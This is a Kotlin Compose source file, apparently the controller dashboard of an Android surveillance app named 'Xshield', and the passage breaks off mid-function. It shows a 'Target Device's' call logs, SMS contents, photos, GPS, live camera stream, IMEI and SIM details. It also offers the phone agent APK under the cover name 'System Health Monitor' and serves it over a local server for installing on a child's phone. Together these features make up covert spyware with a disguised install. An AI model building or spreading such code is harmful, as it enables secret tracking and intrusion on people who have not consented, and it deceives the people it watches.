package com.example.xshield

import androidx.compose.foundation.background
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import kotlinx.coroutines.delay
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.xshield.ui.theme.*
import androidx.compose.material3.pulltorefresh.PullToRefreshBox
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
data class ActivityLogItemData(
    val icon: ImageVector,
    val title: String,
    val subtitle: String,
    val time: String,
    val color: Color
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(
    selectedDevice: String,
    childDevices: List<String>,
    onDeviceSelected: (String) -> Unit,
    onAddDeviceClick: () -> Unit,
    onRemoveDevice: (String) -> Unit,
    onNavigateTo: (String) -> Unit,
    onServerToggle: (Boolean) -> Unit = {}
) {
    val scrollState = rememberScrollState()
    val clipboardManager = LocalClipboardManager.current
    var isRefreshing by remember { mutableStateOf(false) }
    val coroutineScope = rememberCoroutineScope()

    // Dynamic stats based on selected device
    val deviceBattery = XshieldRepository.deviceBattery.value
    val deviceNetwork = XshieldRepository.deviceNetwork.value
    val deviceBatteryColor = if (deviceBattery.contains("Charging", ignoreCase = true) || 
        (deviceBattery.filter { it.isDigit() }.toIntOrNull() ?: 100) > 30) Color(0xFF5CB85C) else Color(0xFFF0AD4E)

    val statsCalls = XshieldRepository.callsList.size.toString()
    val statsSms = XshieldRepository.smsList.size.toString()
    val statsGps = if (XshieldRepository.callsList.isNotEmpty()) "Active" else "Standby"
    val statsPictures = XshieldRepository.picturesList.size.toString()

    val logs = remember(XshieldRepository.callsList.size, XshieldRepository.smsList.size, XshieldRepository.picturesList.size) {
        val list = mutableListOf<ActivityLogItemData>()
        XshieldRepository.callsList.forEach { c ->
            list.add(ActivityLogItemData(
                icon = Icons.Default.Call,
                title = "${c.type} Call - ${c.name} (${c.number})",
                subtitle = "Duration: ${c.duration}s",
                time = c.date,
                color = AccentTeal
            ))
        }
        XshieldRepository.smsList.forEach { s ->
            list.add(ActivityLogItemData(
                icon = Icons.Default.Message,
                title = "SMS ${s.type} - ${s.name} (${s.number})",
                subtitle = s.message,
                time = s.date,
                color = PrimaryBlue
            ))
        }
        XshieldRepository.picturesList.forEach { p ->
            list.add(ActivityLogItemData(
                icon = Icons.Default.Photo,
                title = "Photo Added",
                subtitle = p.info,
                time = p.date,
                color = RedAlert
            ))
        }
        list.sortByDescending { it.time }
        if (list.isEmpty()) {
            listOf(
                ActivityLogItemData(Icons.Default.Sync, "No Activity Yet", "Waiting for data sync...", "", LightText)
            )
        } else {
            list.take(5)
        }
    }

    PullToRefreshBox(
        isRefreshing = isRefreshing,
        onRefresh = {
            coroutineScope.launch {
                isRefreshing = true
                if (selectedDevice.isNotBlank()) {
                    com.google.firebase.database.FirebaseDatabase.getInstance()
                        .getReference("commands/$selectedDevice/syncSms")
                        .setValue(System.currentTimeMillis())
                }
                delay(1500)
                isRefreshing = false
            }
        },
        modifier = Modifier.fillMaxSize()
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(BackgroundGrey)
                .verticalScroll(scrollState)
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
        // Device Summary Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Box(
                        modifier = Modifier
                            .size(48.dp)
                            .background(AccentTeal.copy(alpha = 0.1f), CircleShape),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = Icons.Default.PhoneAndroid,
                            contentDescription = "Device",
                            tint = AccentTeal,
                            modifier = Modifier.size(28.dp)
                        )
                    }
                    Column(modifier = Modifier.weight(1f)) {
                        val friendlyName = XshieldRepository.deviceNamesMap[selectedDevice] ?: selectedDevice
                        Text(
                            text = friendlyName,
                            color = DarkText,
                            fontSize = 18.sp,
                            fontWeight = FontWeight.Bold
                        )
                        Text(
                            text = "Target Device Connected • Synced 1 min ago",
                            color = LightText,
                            fontSize = 12.sp
                        )
                    }
                    val isOnline = XshieldRepository.deviceOnlineStatus.value == "online"
                    val statusText = if (isOnline) "ONLINE" else "OFFLINE"
                    val statusColor = if (isOnline) Color(0xFF5CB85C) else Color(0xFFC62828)
                    val statusBgColor = statusColor.copy(alpha = 0.15f)

                    Box(
                        modifier = Modifier
                            .background(statusBgColor, RoundedCornerShape(8.dp))
                            .padding(horizontal = 8.dp, vertical = 4.dp)
                    ) {
                        Text(
                            text = statusText,
                            color = statusColor,
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }

                Divider(color = BorderColor)

                // Telemetry Details Grid
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    TelemetryMiniItem(
                        icon = Icons.Default.BatteryChargingFull,
                        label = "Battery",
                        value = deviceBattery,
                        color = deviceBatteryColor
                    )
                    TelemetryMiniItem(
                        icon = Icons.Default.Wifi,
                        label = "Network",
                        value = deviceNetwork,
                        color = PrimaryBlue
                    )
                    TelemetryMiniItem(
                        icon = Icons.Default.LocationOn,
                        label = "GPS",
                        value = "Active",
                        color = RedAlert
                    )
                }

                Divider(color = BorderColor)

                // Share installer APK action button
                val context = androidx.compose.ui.platform.LocalContext.current
                OutlinedButton(
                    onClick = { shareChildApk(context) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = AccentTeal),
                    border = BorderStroke(1.dp, AccentTeal),
                    shape = RoundedCornerShape(4.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Share,
                        contentDescription = "Share System Health Monitor APK",
                        modifier = Modifier.size(16.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "SHARE SYSTEM HEALTH MONITOR (APK)",
                        fontWeight = FontWeight.Bold,
                        fontSize = 11.sp
                    )
                }
            }
        }

        // Linked Target Devices Manager Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        text = "Linked Target Devices",
                        color = DarkText,
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                    Box(
                        modifier = Modifier
                            .background(AccentTeal.copy(alpha = 0.15f), RoundedCornerShape(4.dp))
                            .padding(horizontal = 6.dp, vertical = 2.dp)
                    ) {
                        Text(
                            text = "${childDevices.size} Linked",
                            color = AccentTeal,
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }

                Divider(color = BorderColor)

                // Device List
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    childDevices.forEach { device ->
                        val isActive = device == selectedDevice
                        Card(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable { onDeviceSelected(device) },
                            colors = CardDefaults.cardColors(
                                containerColor = if (isActive) AccentTeal.copy(alpha = 0.05f) else Color.Transparent
                            ),
                            border = BorderStroke(
                                width = 1.dp,
                                color = if (isActive) AccentTeal else BorderColor
                            ),
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(horizontal = 12.dp, vertical = 8.dp),
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.SpaceBetween
                            ) {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.PhoneAndroid,
                                        contentDescription = null,
                                        tint = if (isActive) AccentTeal else LightText,
                                        modifier = Modifier.size(20.dp)
                                    )
                                    Column {
                                        val friendlyName = XshieldRepository.deviceNamesMap[device] ?: device
                                        val status = XshieldRepository.deviceStatusesMap[device] ?: "offline"
                                        val isOnline = status == "online"
                                        Text(
                                            text = friendlyName,
                                            color = DarkText,
                                            fontSize = 14.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                        Text(
                                            text = if (isOnline) "Online • Active" else "Offline • Inactive",
                                            color = if (isOnline) AccentTeal else LightText,
                                            fontSize = 11.sp
                                        )
                                    }
                                }
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                                ) {
                                    val status = XshieldRepository.deviceStatusesMap[device] ?: "offline"
                                    val isOnline = status == "online"
                                    Box(
                                        modifier = Modifier
                                            .background(
                                                if (isOnline) Color(0xFF5CB85C).copy(alpha = 0.15f) else Color.LightGray.copy(alpha = 0.2f),
                                                RoundedCornerShape(4.dp)
                                            )
                                            .padding(horizontal = 6.dp, vertical = 2.dp)
                                    ) {
                                        Text(
                                            text = if (isOnline) "ACTIVE" else "INACTIVE",
                                            color = if (isOnline) Color(0xFF2E7D32) else LightText,
                                            fontSize = 9.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    }

                                    // Remove Device button
                                    if (childDevices.size > 1) {
                                        IconButton(
                                            onClick = { onRemoveDevice(device) },
                                            modifier = Modifier.size(24.dp)
                                        ) {
                                            Icon(
                                                imageVector = Icons.Default.Delete,
                                                contentDescription = "Remove Device",
                                                tint = RedAlert.copy(alpha = 0.8f),
                                                modifier = Modifier.size(16.dp)
                                            )
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                // Link Device Button
                Button(
                    onClick = onAddDeviceClick,
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = AccentTeal),
                    shape = RoundedCornerShape(4.dp)
                ) {
                    Icon(
                        imageVector = Icons.Default.Add,
                        contentDescription = "Link New Device",
                        tint = Color.White,
                        modifier = Modifier.size(16.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "LINK NEW DEVICE",
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 12.sp
                    )
                }
            }
        }

        // Local Network Web Server Card
        val isServerRunning by XshieldRepository.isServerRunning
        val serverPort = 8080
        var showCopiedToast by remember { mutableStateOf(false) }

        // Build real local URL when server is running
        val localIp = remember { LocalWebServer.getLocalIpAddress() }
        val generatedUrl = if (isServerRunning) {
            "http://$localIp:$serverPort/?auth=${XshieldRepository.secureToken}"
        } else ""

        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.Wifi,
                            contentDescription = null,
                            tint = PrimaryBlue,
                            modifier = Modifier.size(20.dp)
                        )
                        Text(
                            text = "Local Network Remote Access",
                            color = DarkText,
                            fontSize = 15.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    Switch(
                        checked = isServerRunning,
                        onCheckedChange = { enabled -> onServerToggle(enabled) },
                        colors = SwitchDefaults.colors(
                            checkedThumbColor = Color.White,
                            checkedTrackColor = AccentTeal
                        )
                    )
                }

                Divider(color = BorderColor)

                if (isServerRunning) {
                    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(8.dp)
                                    .background(Color(0xFF5CB85C), CircleShape)
                            )
                            Text(
                                text = "LOCAL SERVER RUNNING ON PORT $serverPort",
                                color = Color(0xFF2E7D32),
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }

                        Text(
                            text = "Open the link below on any browser connected to the same Wi-Fi network to access the live monitoring dashboard:",
                            fontSize = 12.sp,
                            color = LightText
                        )

                        // URL Display Box
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(BackgroundGrey, RoundedCornerShape(6.dp))
                                .border(1.dp, BorderColor, RoundedCornerShape(6.dp))
                                .padding(12.dp)
                        ) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Text(
                                    text = generatedUrl,
                                    color = PrimaryBlue,
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    maxLines = 2,
                                    overflow = TextOverflow.Ellipsis,
                                    modifier = Modifier.weight(1f)
                                )
                                IconButton(
                                    onClick = {
                                        if (generatedUrl.isNotBlank()) {
                                            clipboardManager.setText(AnnotatedString(generatedUrl))
                                            showCopiedToast = true
                                        }
                                    },
                                    modifier = Modifier.size(32.dp)
                                ) {
                                    Icon(
                                        imageVector = Icons.Default.ContentCopy,
                                        contentDescription = "Copy Link",
                                        tint = AccentTeal,
                                        modifier = Modifier.size(18.dp)
                                    )
                                }
                            }
                        }

                        if (showCopiedToast) {
                            Text(
                                text = "✓ Link copied! Open it in any browser on the same Wi-Fi.",
                                color = Color(0xFF2E7D32),
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold
                            )
                            LaunchedEffect(showCopiedToast) {
                                delay(2500)
                                showCopiedToast = false
                            }
                        }

                        Spacer(modifier = Modifier.height(4.dp))

                        // Local Wi-Fi download link helper
                        val localIp = LocalWebServer.getLocalIpAddress()
                        val serverPort = 8080
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(Color(0xFF2E7D32).copy(alpha = 0.08f), RoundedCornerShape(6.dp))
                                .border(1.dp, Color(0xFF2E7D32).copy(alpha = 0.2f), RoundedCornerShape(6.dp))
                                .padding(12.dp)
                        ) {
                            Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                                Text(
                                    text = "Wi-Fi Install Guide for Child Device:",
                                    fontWeight = FontWeight.Bold,
                                    color = Color(0xFF2E7D32),
                                    fontSize = 12.sp
                                )
                                val ipApkUrl = "http://$localIp:$serverPort/childagent.apk?auth=${XshieldRepository.secureToken}"
                                Text(
                                    text = "Open this link in the child's browser to download and install the agent directly:\n$ipApkUrl",
                                    fontSize = 11.sp,
                                    color = Color(0xFF2E7D32)
                                )
                            }
                        }

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(64.dp)
                                    .background(Color.White)
                                    .border(1.dp, BorderColor, RoundedCornerShape(4.dp))
                                    .padding(4.dp),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.QrCode2,
                                    contentDescription = "QR",
                                    tint = DarkText,
                                    modifier = Modifier.size(56.dp)
                                )
                            }
                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    text = "Tip: Open on Another Device",
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = DarkText
                                )
                                Text(
                                    text = "Copy the URL and paste it in your PC or tablet browser. Both devices must be on the same Wi-Fi network.",
                                    fontSize = 11.sp,
                                    color = LightText
                                )
                            }
                        }
                    }
                } else {
                    Text(
                        text = "Turn on the server switch to start the built-in local web server. It will generate a real link you can open in any browser on the same Wi-Fi network — no internet required.",
                        fontSize = 12.sp,
                        color = LightText
                    )
                }
            }
        }

        // ── Device Info Card ──────────────────────────────────────────────────
        val devManufacturer by XshieldRepository.deviceManufacturer
        val devModel by XshieldRepository.deviceModel
        val devBrand by XshieldRepository.deviceBrand
        val devHardware by XshieldRepository.deviceHardware
        val devCpuAbi by XshieldRepository.deviceCpuAbi
        val devSdkVersion by XshieldRepository.deviceSdkVersion
        val devScreenRes by XshieldRepository.deviceScreenResolution
        val devAndroidVer by XshieldRepository.deviceAndroidVersion
        val devImei by XshieldRepository.deviceImei
        val devSimSerial by XshieldRepository.deviceSimSerialNumber
        val devSimOp by XshieldRepository.deviceSimOperator
        val devSimState by XshieldRepository.deviceSimState
        val devCarrier by XshieldRepository.devicePhoneNetworkOperator
        val devPhone by XshieldRepository.devicePhoneNumber
        val devLocalIp by XshieldRepository.deviceLocalIp
        val devUptimeMs by XshieldRepository.deviceUptime
        val devStorageTotal by XshieldRepository.deviceStorageTotal
        val devStorageUsed by XshieldRepository.deviceStorageUsed
        val devRamTotal by XshieldRepository.deviceRamTotal
        val devRamAvail by XshieldRepository.deviceRamAvailable

        // Derived formatted values
        val uptimeStr = remember(devUptimeMs) {
            if (devUptimeMs <= 0L) "—" else {
                val secs = devUptimeMs / 1000
                val d = secs / 86400; val h = (secs % 86400) / 3600; val m = (secs % 3600) / 60
                "${d}d ${h}h ${m}m"
            }
        }
        val storageTotalGB = if (devStorageTotal > 0) devStorageTotal / (1024f * 1024f * 1024f) else 0f
        val storageUsedGB  = if (devStorageUsed  > 0) devStorageUsed  / (1024f * 1024f * 1024f) else 0f
        val storagePercent = if (storageTotalGB > 0) (storageUsedGB / storageTotalGB * 100).toInt() else 0
        val ramTotalGB  = if (devRamTotal  > 0) devRamTotal  / (1024f * 1024f * 1024f) else 0f
        val ramAvailGB  = if (devRamAvail  > 0) devRamAvail  / (1024f * 1024f * 1024f) else 0f
        val ramUsedGB   = (ramTotalGB - ramAvailGB).coerceAtLeast(0f)
        val ramPercent  = if (ramTotalGB > 0) (ramUsedGB / ramTotalGB * 100).toInt() else 0

        var isDevInfoExpanded by remember { mutableStateOf(false) }

        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                // Card Header with expand/collapse toggle
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.PhoneAndroid,
                            contentDescription = null,
                            tint = AccentTeal,
                            modifier = Modifier.size(20.dp)
                        )
                        Text(
                            text = "Device Info",
                            color = DarkText,
                            fontSize = 15.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    IconButton(
                        onClick = { isDevInfoExpanded = !isDevInfoExpanded },
                        modifier = Modifier.size(32.dp)
                    ) {
                        Icon(
                            imageVector = if (isDevInfoExpanded) Icons.Default.ExpandLess else Icons.Default.ExpandMore,
                            contentDescription = if (isDevInfoExpanded) "Collapse" else "Expand",
                            tint = LightText,
                            modifier = Modifier.size(20.dp)
                        )
                    }
                }

                // Quick summary row (always visible)
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    // Model chip
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .background(AccentTeal.copy(alpha = 0.08f), RoundedCornerShape(8.dp))
                            .border(1.dp, AccentTeal.copy(alpha = 0.2f), RoundedCornerShape(8.dp))
                            .padding(horizontal = 10.dp, vertical = 8.dp)
                    ) {
                        Column {
                            Text(text = "Model", fontSize = 10.sp, color = AccentTeal, fontWeight = FontWeight.Bold)
                            Text(
                                text = if (devModel.isNotBlank()) devModel else "—",
                                fontSize = 12.sp, color = DarkText, fontWeight = FontWeight.Bold,
                                maxLines = 1, overflow = TextOverflow.Ellipsis
                            )
                        }
                    }
                    // Android chip
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .background(PrimaryBlue.copy(alpha = 0.08f), RoundedCornerShape(8.dp))
                            .border(1.dp, PrimaryBlue.copy(alpha = 0.2f), RoundedCornerShape(8.dp))
                            .padding(horizontal = 10.dp, vertical = 8.dp)
                    ) {
                        Column {
                            Text(text = "Android", fontSize = 10.sp, color = PrimaryBlue, fontWeight = FontWeight.Bold)
                            Text(
                                text = if (devAndroidVer.isNotBlank()) devAndroidVer else "—",
                                fontSize = 12.sp, color = DarkText, fontWeight = FontWeight.Bold,
                                maxLines = 1, overflow = TextOverflow.Ellipsis
                            )
                        }
                    }
                    // Battery chip
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .background(deviceBatteryColor.copy(alpha = 0.1f), RoundedCornerShape(8.dp))
                            .border(1.dp, deviceBatteryColor.copy(alpha = 0.3f), RoundedCornerShape(8.dp))
                            .padding(horizontal = 10.dp, vertical = 8.dp)
                    ) {
                        Column {
                            Text(text = "Battery", fontSize = 10.sp, color = deviceBatteryColor, fontWeight = FontWeight.Bold)
                            Text(
                                text = deviceBattery,
                                fontSize = 11.sp, color = DarkText, fontWeight = FontWeight.Bold,
                                maxLines = 1, overflow = TextOverflow.Ellipsis
                            )
                        }
                    }
                }

                if (isDevInfoExpanded) {
                    HorizontalDivider(color = BorderColor)

                    // ── Section 1: Static Hardware & Identifiers ──
                    Text(
                        text = "⬡  STATIC HARDWARE & IDENTIFIERS",
                        fontSize = 10.sp,
                        fontWeight = FontWeight.Bold,
                        color = AccentTeal,
                        letterSpacing = 0.8.sp
                    )

                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(BackgroundGrey, RoundedCornerShape(8.dp))
                            .padding(12.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        DevInfoRow("Manufacturer", if (devManufacturer.isNotBlank()) devManufacturer else "—")
                        DevInfoRow("Model", if (devModel.isNotBlank()) devModel else "—")
                        DevInfoRow("Brand", if (devBrand.isNotBlank()) devBrand else "—")
                        DevInfoRow("Hardware Board", if (devHardware.isNotBlank()) devHardware else "—")
                        DevInfoRow("CPU Architecture", if (devCpuAbi.isNotBlank()) devCpuAbi else "—")
                        DevInfoRow("Screen Resolution", if (devScreenRes.isNotBlank()) devScreenRes else "—")
                        DevInfoRow("Android SDK", if (devSdkVersion > 0) "API $devSdkVersion" else "—")
                        DevInfoRow("SIM Serial (ICCID)", if (devSimSerial.isNotBlank()) devSimSerial else "Unavailable")
                        // IMEI / Android ID — full-width selectable chip
                        Column(verticalArrangement = Arrangement.spacedBy(2.dp)) {
                            Text(text = "Device ID (IMEI / ANDROID_ID)", fontSize = 10.sp, color = LightText, fontWeight = FontWeight.Medium)
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .background(WhiteSurface, RoundedCornerShape(4.dp))
                                    .border(1.dp, BorderColor, RoundedCornerShape(4.dp))
                                    .padding(horizontal = 8.dp, vertical = 6.dp)
                            ) {
                                Text(
                                    text = if (devImei.isNotBlank()) devImei else "Unavailable",
                                    fontSize = 11.sp,
                                    color = DarkText,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                                )
                            }
                        }
                    }

                    HorizontalDivider(color = BorderColor)

                    // ── Section 2: Dynamic Status ──────────────────
                    Text(
                        text = "◉  DYNAMIC STATUS & DIAGNOSTICS",
                        fontSize = 10.sp,
                        fontWeight = FontWeight.Bold,
                        color = PrimaryBlue,
                        letterSpacing = 0.8.sp
                    )

                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(BackgroundGrey, RoundedCornerShape(8.dp))
                            .padding(12.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        DevInfoRow("System Uptime", uptimeStr)
                        DevInfoRow("Battery Status", deviceBattery)
                        DevInfoRow("Network Type", if (devLocalIp.isNotBlank()) deviceNetwork else deviceNetwork)
                        DevInfoRow("Local IP Address", if (devLocalIp.isNotBlank()) devLocalIp else "—")
                        DevInfoRow("SIM Operator", if (devSimOp.isNotBlank()) devSimOp else "—")
                        DevInfoRow("SIM State", if (devSimState.isNotBlank()) devSimState else "—")
                        DevInfoRow("Carrier Network", if (devCarrier.isNotBlank()) devCarrier else "—")
                        DevInfoRow("SIM Phone Number", if (devPhone.isNotBlank()) devPhone else "Unavailable")

                        // RAM Usage with progress bar
                        Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween
                            ) {
                                Text(text = "RAM Usage", fontSize = 10.sp, color = LightText, fontWeight = FontWeight.Medium)
                                Text(
                                    text = if (ramTotalGB > 0f) "${"%.1f".format(ramUsedGB)} / ${"%.1f".format(ramTotalGB)} GB ($ramPercent%)" else "—",
                                    fontSize = 11.sp, color = DarkText, fontWeight = FontWeight.Bold
                                )
                            }
                            if (ramTotalGB > 0f) {
                                LinearProgressIndicator(
                                    progress = { (ramUsedGB / ramTotalGB).coerceIn(0f, 1f) },
                                    modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                                    color = if (ramPercent > 80) RedAlert else AccentTeal,
                                    trackColor = BorderColor
                                )
                            }
                        }

                        // Storage Usage with progress bar
                        Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween
                            ) {
                                Text(text = "Internal Storage", fontSize = 10.sp, color = LightText, fontWeight = FontWeight.Medium)
                                Text(
                                    text = if (storageTotalGB > 0f) "${"%.1f".format(storageUsedGB)} / ${"%.0f".format(storageTotalGB)} GB ($storagePercent%)" else "—",
                                    fontSize = 11.sp, color = DarkText, fontWeight = FontWeight.Bold
                                )
                            }
                            if (storageTotalGB > 0f) {
                                LinearProgressIndicator(
                                    progress = { (storageUsedGB / storageTotalGB).coerceIn(0f, 1f) },
                                    modifier = Modifier.fillMaxWidth().height(4.dp).clip(RoundedCornerShape(2.dp)),
                                    color = if (storagePercent > 85) RedAlert else PrimaryBlue,
                                    trackColor = BorderColor
                                )
                            }
                        }
                    }
                }
            }
        }

        // Monitoring Stats Grid (Quick Navigation)
        Text(
            text = "Monitoring Overview",
            color = DarkText,
            fontSize = 16.sp,
            fontWeight = FontWeight.Bold
        )

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            StatCard(
                title = "Calls Logged",
                count = statsCalls,
                subtitle = "Last call: 5m ago",
                icon = Icons.Default.Call,
                color = AccentTeal,
                modifier = Modifier.weight(1f),
                onClick = { onNavigateTo("Calls") }
            )
            StatCard(
                title = "SMS Tracked",
                count = statsSms,
                subtitle = "Last SMS: 2m ago",
                icon = Icons.Default.Message,
                color = PrimaryBlue,
                modifier = Modifier.weight(1f),
                onClick = { onNavigateTo("SMS") }
            )
        }

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            StatCard(
                title = "GPS Positions",
                count = statsGps,
                subtitle = "Last coordinate: Now",
                icon = Icons.Default.LocationOn,
                color = Color(0xFFF0AD4E),
                modifier = Modifier.weight(1f),
                onClick = { onNavigateTo("Locations") }
            )
            StatCard(
                title = "Pictures Captured",
                count = statsPictures,
                subtitle = "Last photo: 3h ago",
                icon = Icons.Default.PhotoLibrary,
                color = RedAlert,
                modifier = Modifier.weight(1f),
                onClick = { onNavigateTo("Pictures") }
            )
        }

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            StatCard(
                title = "Live Camera Stream",
                count = "WebRTC",
                subtitle = "Real-time P2P Video",
                icon = Icons.Default.Videocam,
                color = Color(0xFF9C27B0),
                modifier = Modifier.weight(1f),
                onClick = { onNavigateTo("Live viewing") }
            )
            Spacer(modifier = Modifier.weight(1f))
        }

        // Recent Logs Feed Stream
        Text(
            text = "Recent Target Activity Log",
            color = DarkText,
            fontSize = 16.sp,
            fontWeight = FontWeight.Bold
        )

        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = WhiteSurface),
            shape = RoundedCornerShape(12.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                logs.forEachIndexed { index, item ->
